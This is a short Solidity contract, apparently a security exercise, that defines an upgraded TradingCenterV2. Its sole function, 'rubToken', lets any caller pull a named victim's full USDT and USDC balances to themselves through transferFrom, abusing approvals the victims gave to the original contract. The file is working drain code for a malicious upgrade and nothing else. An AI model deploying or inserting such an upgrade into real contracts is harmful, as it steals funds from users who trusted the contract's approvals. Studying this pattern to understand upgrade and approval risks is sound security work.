// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import {TradingCenter} from "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter {
    function rubToken(address victimAddre) public {
        usdt.transferFrom(victimAddre, msg.sender, usdt.balanceOf(victimAddre));
        usdc.transferFrom(victimAddre, msg.sender, usdc.balanceOf(victimAddre));
    }
}
